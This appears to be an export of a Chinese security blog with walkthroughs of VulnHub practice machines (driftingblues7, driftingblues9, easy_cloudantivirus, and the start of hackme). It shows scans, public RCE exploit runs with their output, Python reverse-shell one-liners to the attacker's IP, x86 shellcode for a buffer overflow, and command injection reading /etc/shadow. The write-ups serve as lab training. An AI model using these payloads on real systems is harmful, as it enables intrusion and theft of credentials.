class="line">2021/05/27 07:52:47 Finished</span><br><span class="line">===============================================================</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">gobuster dir -u http://192.168.43.21:66/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="登录web"><a href="#登录web" class="headerlink" title="登录web"></a>登录web</h3><ul>
<li>首页</li>
</ul>
<p><img data-src="./driftingblues7/1.png" alt></p>
<ul>
<li><a href="http://192.168.43.21:66/" target="_blank" rel="noopener">http://192.168.43.21:66/</a></li>
</ul>
<p><img data-src="./driftingblues7/2.png" alt></p>
<ul>
<li><a href="http://192.168.43.21:66/flag.txt" target="_blank" rel="noopener">http://192.168.43.21:66/flag.txt</a></li>
</ul>
<p><img data-src="./driftingblues7/3.png" alt></p>
<h3 id="访问-eon"><a href="#访问-eon" class="headerlink" title="访问/eon"></a>访问/eon</h3><p><a href="http://192.168.43.21:66/eon" target="_blank" rel="noopener">http://192.168.43.21:66/eon</a></p>
<p><img data-src="./driftingblues7/4.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">UEsDBBQAAQAAAAOfg1LxSVvWHwAAABMAAAAJAAAAY3JlZHMudHh093OsvnCY1d4tLCZqMvRD+ZUU</span><br><span class="line">Rw+5YmOf9bS11scvmFBLAQI/ABQAAQAAAAOfg1LxSVvWHwAAABMAAAAJACQAAAAAAAAAIAAAAAAA</span><br><span class="line">AABjcmVkcy50eHQKACAAAAAAAAEAGABssaU7qijXAYPcazaqKNcBg9xrNqoo1wFQSwUGAAAAAAEA</span><br><span class="line">AQBbAAAARgAAAAAA</span><br></pre></td></tr></table></figure>

<ul>
<li><code>base64 to file</code></li>
</ul>
<p><a href="https://base64.guru/converter/decode/file" target="_blank" rel="noopener">https://base64.guru/converter/decode/file</a></p>
<p><img data-src="./driftingblues7/5.png" alt></p>
<ul>
<li>解压需要密码</li>
</ul>
<p><img data-src="./driftingblues7/6.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">fcrackzip  -D -p /usr/share/wordlists/rockyou.txt -u ./application.zip </span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">(root💀weiyi)-[/home/weiyi/vulnhub/driftingblues7]</span><br><span class="line">└─# fcrackzip  -D -p /usr/share/wordlists/rockyou.txt -u ./application.zip </span><br><span class="line"></span><br><span class="line">PASSWORD FOUND!!!!: pw == killah</span><br></pre></td></tr></table></figure>

<p><img data-src="./driftingblues7/7.png" alt></p>
<p>获得账号密码<code>admin / isitreal31__</code></p>
<ul>
<li>登录<code>web</code></li>
</ul>
<p><img data-src="./driftingblues7/8.png" alt></p>
<h3 id="WebShell-amp-amp-Flag"><a href="#WebShell-amp-amp-Flag" class="headerlink" title="WebShell&amp;&amp;Flag"></a>WebShell&amp;&amp;Flag</h3><p><a href="https://www.exploit-db.com/exploits/48025" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/48025</a></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 expoit.py https://192.168.43.21/ -ip 192.168.43.46 -user admin -password isitreal31__ </span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">┌──(root💀weiyi)-[/home/weiyi/vulnhub/driftingblues7]</span><br><span class="line">└─# python3 expoit.py https://192.168.43.21/ -ip 192.168.43.46 -user admin -password isitreal31__                                                                                                                2 ⨯</span><br><span class="line">+-----------------------------------------------------------------------------+</span><br><span class="line">| EyesOfNetwork 5.3 RCE (API v2.4.2)                                          |</span><br><span class="line">| 02/2020 - Clément Billac Twitter: @h4knet                                  |</span><br><span class="line">+-----------------------------------------------------------------------------+</span><br><span class="line"></span><br><span class="line">[*] EyesOfNetwork login page found</span><br><span class="line">[*] EyesOfNetwork API page found. API version: 2.4.2</span><br><span class="line">[+] Admin user key obtained: ab87fd9c3033faf97bb00d2a6c61124bd7d9f244d8935acb295ac1eeabdecc1f</span><br><span class="line">[!] The user admin already exists</span><br><span class="line">[+] Successfully authenticated</span><br><span class="line">[+] Discovery job successfully created with ID: 1&amp;amp;review=1" id="completemsg" style="display: none;"&gt;</span><br><span class="line">&lt;div class="roundedcorner_success_box"&gt;</span><br><span class="line">&lt;div class="roundedcorner_success_top"&gt;&lt;div&gt;&lt;/div&gt;&lt;/div&gt;</span><br><span class="line">&lt;div class="roundedcorner_success_content"&gt;</span><br><span class="line">	      Auto-Discovery Complete.  Click to Continue To Reviewing Found Devices</span><br><span class="line">	      &lt;/div&gt;</span><br><span class="line">&lt;div class="roundedcorner_success_bottom"&gt;&lt;div&gt;&lt;/div&gt;&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;&lt;/a&gt;</span><br><span class="line">[*]  Spawning netcat listener: </span><br><span class="line">listening on [192.168.43.46] 443 ...</span><br><span class="line">connect to [192.168.43.46] from (UNKNOWN) [192.168.43.21] 33044</span><br><span class="line">sh: no job control in this shell</span><br><span class="line">sh-4.2# id</span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure>

<p><img data-src="./driftingblues7/9.png" alt></p>
]]></content>
      <categories>
        <category>靶场</category>
        <category>driftingblues7</category>
      </categories>
      <tags>
        <tag>入门</tag>
        <tag>综合靶场测试</tag>
      </tags>
  </entry>
  <entry>
    <title>driftingblues9</title>
    <url>/2021/05/27/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/driftingblues9/</url>
    <content><![CDATA[<h1 id="driftingblues9"><a href="#driftingblues9" class="headerlink" title="driftingblues9"></a>driftingblues9</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    一道boot2root的综合靶场练习</p>
<a id="more"></a>

<h2 id="基础环境"><a href="#基础环境" class="headerlink" title="基础环境"></a>基础环境</h2><ul>
<li>kali2021</li>
<li>driftingblues9</li>
<li>windows10</li>
</ul>
<h2 id="测试步骤"><a href="#测试步骤" class="headerlink" title="测试步骤"></a>测试步骤</h2><h3 id="发现目标"><a href="#发现目标" class="headerlink" title="发现目标"></a>发现目标</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">┌──(root💀weiyi)-[/home/weiyi/vulnhub/driftingblues9]</span><br><span class="line">└─# arp-scan -l</span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:0c:29:0e:9a:51, IPv4: 192.168.43.46</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.43.1	82:46:1b:4c:ff:3f	(Unknown: locally administered)</span><br><span class="line">192.168.43.146	08:00:27:40:15:0e	PCS Systemtechnik GmbH</span><br><span class="line">192.168.43.188	d0:c6:37:be:7e:b3	Intel Corporate</span><br><span class="line"></span><br><span class="line">3 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.9.7: 256 hosts scanned in 1.981 seconds (129.23 hosts/sec). 3 responded</span><br></pre></td></tr></table></figure>

<ul>
<li>目标为 <code>192.168.43.146</code></li>
<li><code>NMAP</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sC -sV -p- 192.168.43.146</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">┌──(root💀weiyi)-[/home/weiyi/vulnhub/driftingblues9]</span><br><span class="line">└─# nmap -sC -sV -p- 192.168.43.146</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-27 08:25 EDT</span><br><span class="line">Nmap scan report for 192.168.43.146</span><br><span class="line">Host is up (0.00044s latency).</span><br><span class="line">Not shown: 65532 closed ports</span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">80/tcp    open  http    Apache httpd 2.4.10 ((Debian))</span><br><span class="line">| http-cookie-flags: </span><br><span class="line">|   /: </span><br><span class="line">|     PHPSESSID: </span><br><span class="line">|_      httponly flag not set</span><br><span class="line">|_http-generator: ApPHP MicroBlog vCURRENT_VERSION</span><br><span class="line">|_http-server-header: Apache/2.4.10 (Debian)</span><br><span class="line">|_http-title: ApPHP MicroBlog</span><br><span class="line">111/tcp   open  rpcbind 2-4 (RPC #100000)</span><br><span class="line">| rpcinfo: </span><br><span class="line">|   program version    port/proto  service</span><br><span class="line">|   100000  2,3,4        111/tcp   rpcbind</span><br><span class="line">|   100000  2,3,4        111/udp   rpcbind</span><br><span class="line">|   100000  3,4          111/tcp6  rpcbind</span><br><span class="line">|   100000  3,4          111/udp6  rpcbind</span><br><span class="line">|   100024  1          32881/tcp   status</span><br><span class="line">|   100024  1          36881/udp   status</span><br><span class="line">|   100024  1          43842/udp6  status</span><br><span class="line">|_  100024  1          60583/tcp6  status</span><br><span class="line">32881/tcp open  status  1 (RPC #100024)</span><br><span class="line">MAC Address: 08:00:27:40:15:0E (Oracle VirtualBox virtual NIC)</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 13.90 seconds</span><br></pre></td></tr></table></figure>

<ul>
<li>目录扫描</li>
</ul>
<p><img data-src="./driftingblues9/1.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http://192.168.43.146/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">┌──(root💀weiyi)-[/home/weiyi]</span><br><span class="line">└─# gobuster dir -u http://192.168.43.146/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.1.0</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://192.168.43.146/</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 10</span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.1.0</span><br><span class="line">[+] Extensions:              txt,php,html</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">2021/05/27 08:38:18 Starting gobuster in directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/images               (Status: 301) [Size: 317] [--&gt; http://192.168.43.146/images/]</span><br><span class="line">/index.php            (Status: 200) [Size: 5656]                                   </span><br><span class="line">/docs                 (Status: 301) [Size: 315] [--&gt; http://192.168.43.146/docs/]  </span><br><span class="line">/page                 (Status: 301) [Size: 315] [--&gt; http://192.168.43.146/page/]  </span><br><span class="line">/header.php           (Status: 200) [Size: 13]                                     </span><br><span class="line">/admin                (Status: 301) [Size: 316] [--&gt; http://192.168.43.146/admin/] </span><br><span class="line">/footer.php           (Status: 500) [Size: 614]                                    </span><br><span class="line">/license              (Status: 301) [Size: 318] [--&gt; http://192.168.43.146/license/]</span><br><span class="line">/README.txt           (Status: 200) [Size: 975]                                     </span><br><span class="line">/js                   (Status: 301) [Size: 313] [--&gt; http://192.168.43.146/js/]     </span><br><span class="line">/include              (Status: 301) [Size: 318] [--&gt; http://192.168.43.146/include/]</span><br><span class="line">/backup               (Status: 301) [Size: 317] [--&gt; http://192.168.43.146/backup/] </span><br><span class="line">/styles               (Status: 301) [Size: 317] [--&gt; http://192.168.43.146/styles/] </span><br><span class="line">/INSTALL.txt          (Status: 200) [Size: 1201]                                    </span><br><span class="line">/wysiwyg              (Status: 301) [Size: 318] [--&gt; http://192.168.43.146/wysiwyg/]</span><br><span class="line">/server-status        (Status: 403) [Size: 279]                                     </span><br><span class="line">/mails                (Status: 301) [Size: 316] [--&gt; http://192.168.43.146/mails/]  </span><br><span class="line">                                                                                    </span><br><span class="line">===============================================================</span><br><span class="line">2021/05/27 08:40:52 Finished</span><br><span class="line">===============================================================</span><br></pre></td></tr></table></figure>

<h3 id="登录web"><a href="#登录web" class="headerlink" title="登录web"></a>登录web</h3><ul>
<li>首页</li>
</ul>
<p><img data-src="./driftingblues9/2.png" alt></p>
<ul>
<li>登录<a href="http://192.168.43.146/mails/" target="_blank" rel="noopener">http://192.168.43.146/mails/</a></li>
</ul>
<p><img data-src="./driftingblues9/3.png" alt></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.43.146&#x2F;mails&#x2F;password_forgotten.txt</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">Hello _USER_NAME_!&lt;br&gt; &lt;br&gt;</span><br><span class="line"></span><br><span class="line">You or someone else asked for your login info on our site, _WEB_SITE_</span><br><span class="line"></span><br><span class="line">Your Login Info:</span><br><span class="line">------------------------&lt;br&#x2F;&gt;</span><br><span class="line">Username: _USER_NAME_</span><br><span class="line">Password: _USER_PASSWORD_</span><br><span class="line"></span><br><span class="line">------------------&lt;br&#x2F;&gt;</span><br><span class="line">Best regards,</span><br><span class="line">_WEB_SITE_</span><br></pre></td></tr></table></figure>

<h3 id="前台webshell"><a href="#前台webshell" class="headerlink" title="前台webshell"></a>前台webshell</h3><p><a href="https://www.exploit-db.com/exploits/33070" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/33070</a></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python 33070.py http://192.168.43.146/</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">┌──(root💀weiyi)-[/home/weiyi/vulnhub/driftingblues9]</span><br><span class="line">└─# python 33070.py http://192.168.43.146/</span><br><span class="line">  -= LOTFREE exploit for ApPHP MicroBlog 1.0.1 (Free Version) =-</span><br><span class="line">original exploit by Jiko : http://www.exploit-db.com/exploits/33030/</span><br><span class="line">[*] Testing for vulnerability...</span><br><span class="line">[+] Website is vulnerable</span><br><span class="line"></span><br><span class="line">[*] Fecthing phpinfo</span><br><span class="line">	PHP Version 5.6.40-0+deb8u12</span><br><span class="line">	System   Linux debian 3.16.0-4-586 #1 Debian 3.16.51-2 (2017-12-03) i686</span><br><span class="line">	Loaded Configuration File   /etc/php5/apache2/php.ini</span><br><span class="line">	Apache Version   Apache/2.4.10 (Debian)</span><br><span class="line">	User/Group   www-data(33)/33</span><br><span class="line">	Server Root   /etc/apache2</span><br><span class="line">	DOCUMENT_ROOT   /var/www/html</span><br><span class="line">	PHP Version   5.6.40-0+deb8u12</span><br><span class="line">	allow_url_fopen  On  On</span><br><span class="line">	allow_url_include  Off  Off</span><br><span class="line">	disable_functions  pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,  pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,</span><br><span class="line">	open_basedir   no value    no value</span><br><span class="line">	System V Message based IPC   Wez Furlong</span><br><span class="line">	System V Semaphores   Tom May</span><br><span class="line">	System V Shared Memory   Christian Cartus</span><br><span class="line"></span><br><span class="line">[*] Fetching include/base.inc.php</span><br><span class="line">&lt;?php</span><br><span class="line">			// DATABASE CONNECTION INFORMATION</span><br><span class="line">			define('DATABASE_HOST', 'localhost');	        // Database host</span><br><span class="line">			define('DATABASE_NAME', 'microblog');	        // Name of the database to be used</span><br><span class="line">			define('DATABASE_USERNAME', 'clapton');	// User name for access to database</span><br><span class="line">			define('DATABASE_PASSWORD', 'yaraklitepe');	// Password for access to database</span><br><span class="line">			define('DB_ENCRYPT_KEY', 'p52plaiqb8');		// Database encryption key</span><br><span class="line">			define('DB_PREFIX', 'mb101_');		    // Unique prefix of all table names in the database</span><br><span class="line">			?&gt;</span><br><span class="line"></span><br><span class="line">[*] Testing remote execution</span><br><span class="line">[+] Remote exec is working with system() :)</span><br><span class="line">Submit your commands, type exit to quit</span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> id</span></span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br></pre></td></tr></table></figure>

<ul>
<li>反弹<code>shell</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.43.46",7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span><br></pre></td></tr></table></figure>

<h3 id="提权-amp-amp-Flag"><a href="#提权-amp-amp-Flag" class="headerlink" title="提权&amp;&amp;Flag"></a>提权&amp;&amp;Flag</h3><ul>
<li>账号密码<code>clapton / yaraklitepe</code></li>
</ul>
<p><img data-src="./driftingblues9/4.png" alt></p>
<ul>
<li>发现是二进制安全相关(知识盲区)</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> payload</span></span><br><span class="line">for a in &#123;1..1000&#125;; do (./input $(python -c 'print "A" * 171 + "\x80\x26\x83\xbf" + "\x90" * 2000 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80" ')); done</span><br></pre></td></tr></table></figure>

<p><img data-src="./driftingblues9/5.png" alt></p>
<ul>
<li>菜的安详!!!</li>
</ul>
]]></content>
      <categories>
        <category>靶场</category>
        <category>driftingblues9</category>
      </categories>
      <tags>
        <tag>入门</tag>
        <tag>综合靶场测试</tag>
      </tags>
  </entry>
  <entry>
    <title>easy_cloudantivirus</title>
    <url>/2023/02/15/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/easy_cloudantivirus/</url>
    <content><![CDATA[<h1 id="easy-cloudantivirus"><a href="#easy-cloudantivirus" class="headerlink" title="easy_cloudantivirus"></a>easy_cloudantivirus</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    一道boot2root的综合靶场练习</p>
<a id="more"></a>

<h2 id="基础环境"><a href="#基础环境" class="headerlink" title="基础环境"></a>基础环境</h2><ul>
<li>kali2020</li>
<li>easy_cloudantivirus</li>
<li>windows10</li>
</ul>
<h2 id="测试步骤"><a href="#测试步骤" class="headerlink" title="测试步骤"></a>测试步骤</h2><h3 id="发现目标"><a href="#发现目标" class="headerlink" title="发现目标"></a>发现目标</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">C:\root&gt; arp-scan -l</span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:0c:29:33:c7:0e, IPv4: 192.168.1.237</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.1.1     d8:c8:e9:fe:be:88       Phicomm (Shanghai) Co., Ltd.</span><br><span class="line">192.168.1.98    00:22:6d:62:86:81       Shenzhen GIEC Electronics Co., Ltd.</span><br><span class="line">192.168.1.109   40:31:3c:22:9c:f3       XIAOMI Electronics,CO.,LTD</span><br><span class="line">192.168.1.163   a4:50:46:78:16:9f       Xiaomi Communications Co Ltd</span><br><span class="line">192.168.1.199   08:00:27:38:31:1f       PCS Systemtechnik GmbH</span><br><span class="line">192.168.1.215   c0:e7:3e:b0:0b:5b       (Unknown)</span><br><span class="line">192.168.1.228   44:1c:a8:7f:6d:f4       Hon Hai Precision Ind. Co.,Ltd.</span><br><span class="line">192.168.1.229   08:00:27:76:08:69       PCS Systemtechnik GmbH</span><br><span class="line">192.168.1.180   00:e0:70:d9:ab:16       DH TECHNOLOGY</span><br><span class="line">192.168.1.111   38:d2:ca:db:01:69       Zhejiang Tmall Technology Co., Ltd. (DUP: 1)</span><br><span class="line"></span><br><span class="line">10 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.9.7: 256 hosts scanned in 1.963 seconds (130.41 hosts/sec). 10 responded</span><br></pre></td></tr></table></figure>

<ul>
<li>目标为 <code>192.168.1.199</code></li>
<li><code>NMAP</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sV -A -p 1-65535 192.168.1.199</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">C:\root&gt; nmap -sV -A -p 1-65535 192.168.1.199</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-05 00:43 EDT</span><br><span class="line">Nmap scan report for cloudav.lan (192.168.1.199)</span><br><span class="line">Host is up (0.00032s latency).</span><br><span class="line">Not shown: 65533 closed ports</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 6a:42:4b:7c:2a:06:0f:50:4b:32:cf:b8:31:e9:c4:f4 (RSA)</span><br><span class="line">|   256 81:c7:60:0f:d7:1e:56:f7:a3:1e:9f:76:27:bd:31:27 (ECDSA)</span><br><span class="line">|_  256 71:90:c3:26:ba:3b:e8:b3:53:7e:73:53:27:4d:6b:af (ED25519)</span><br><span class="line">8080/tcp open  http    Werkzeug httpd 0.14.1 (Python 2.7.15rc1)</span><br><span class="line">|_http-server-header: Werkzeug/0.14.1 Python/2.7.15rc1</span><br><span class="line">|_http-title: Site doesn't have a title (text/html; charset=utf-8).</span><br><span class="line">MAC Address: 08:00:27:38:31:1F (Oracle VirtualBox virtual NIC)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.2 - 4.9</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.32 ms cloudav.lan (192.168.1.199)</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 11.22 seconds</span><br></pre></td></tr></table></figure>

<ul>
<li>目录扫描</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http://192.168.1.199:8080/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">... not important</span><br></pre></td></tr></table></figure>

<h3 id="登录web"><a href="#登录web" class="headerlink" title="登录web"></a>登录web</h3><ul>
<li>首页</li>
</ul>
<p><img data-src="./easy_cloudantivirus/1.png" alt></p>
<h3 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h3><p><img data-src="./easy_cloudantivirus/2.png" alt></p>
<ul>
<li>获得密码为 <code>password</code></li>
</ul>
<p><img data-src="./easy_cloudantivirus/3.png" alt></p>
<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><ul>
<li>测试中发现命令执行</li>
</ul>
<p><img data-src="./easy_cloudantivirus/4.png" alt></p>
<p><img data-src="./easy_cloudantivirus/5.png" alt></p>
<ul>
<li>进行反弹<code>shell</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">`python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.6.106",7778));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'`</span><br></pre></td></tr></table></figure>

<ul>
<li>拿到系统权限</li>
</ul>
<p><img data-src="./easy_cloudantivirus/6.png" alt></p>
<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><ul>
<li><code>home</code>目录发现敏感文件</li>
</ul>
<p><img data-src="./easy_cloudantivirus/7.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">scanner@cloudav:~$ cat update_cloudav.c</span><br><span class="line">cat update_cloudav.c</span><br><span class="line"><span class="meta">#</span><span class="bash">include &lt;stdio.h&gt;</span></span><br><span class="line"></span><br><span class="line">int main(int argc, char *argv[])</span><br><span class="line">&#123;</span><br><span class="line">char *freshclam="/usr/bin/freshclam";</span><br><span class="line"></span><br><span class="line">if (argc &lt; 2)&#123;</span><br><span class="line">printf("This tool lets you update antivirus rules\nPlease supply command line arguments for freshclam\n");</span><br><span class="line">return 1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">char *command = malloc(strlen(freshclam) + strlen(argv[1]) + 2);</span><br><span class="line">sprintf(command, "%s %s", freshclam, argv[1]);</span><br><span class="line">setgid(0);</span><br><span class="line">setuid(0);</span><br><span class="line">system(command);</span><br><span class="line">return 0;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;update_cloudav &quot;123 | cat &#x2F;etc&#x2F;shadow&quot;</span><br><span class="line">.&#x2F;update_cloudav &quot;123 | id&quot;</span><br><span class="line">.&#x2F;update_cloudav &quot;123 | ls -al &#x2F;root&quot;</span><br></pre></td></tr></table></figure>

<p><img data-src="./easy_cloudantivirus/8.png" alt></p>
]]></content>
      <categories>
        <category>靶场</category>
        <category>BoredHackerBlog</category>
      </categories>
      <tags>
        <tag>入门</tag>
        <tag>综合靶场测试</tag>
        <tag>BoredHackerBlog</tag>
      </tags>
  </entry>
  <entry>
    <title>hackme</title>
    <url>/2021/01/17/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/hackme/</url>
    <content><![CDATA[<h1 id="hackme"><a href="#hackme" class="headerlink" title="hackme"></a>hackme</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    一道boot2root的综合靶场练习</p>
<a id="more"></a>

<h2 id="基础环境"><a href="#基础环境" class="headerlink" title="基础环境"></a>基础环境</h2><ul>
<li>kali2020</li>
<li>hackme</li>
<li>windows10</li>
</ul>
<h2 id="测试步骤"><a href="#测试步骤" class="headerlink" title="测试步骤"></a>测试步骤</h2><h3 id="发现目标"><a href="#发现目标" class="headerlink" title="发现目标"></a>发现目标</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">root@kali:/home/caixin/Desktop# arp-scan -l</span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:0c:29:fa:35:f2, IPv4: 192.168.43.86</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.43.1    f2:7d:f5:4e:0a:93       (Unknown: locally administered)</span><br><span class="line">192.168.43.25   38:d2:ca:db:01:69       Zhejiang Tmall Technology Co., Ltd.</span><br><span class="line">192.168.43.188  d0:c6:37:be:7e:b3       Intel Corporate</span><br><span class="line">192.168.43.233  00:0c:29:bb:bf:3a       VMware, Inc.</span><br><span class="line"></span><br><span class="line">4 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.9.7: 256 hosts scanned in 1.956 seconds (130.88 hosts/sec). 4 responded</span><br></pre></td></tr></table></figure>

<ul>
<li>目标为 192.168.43.233</li>
<li>NMAP</li>
</ul>
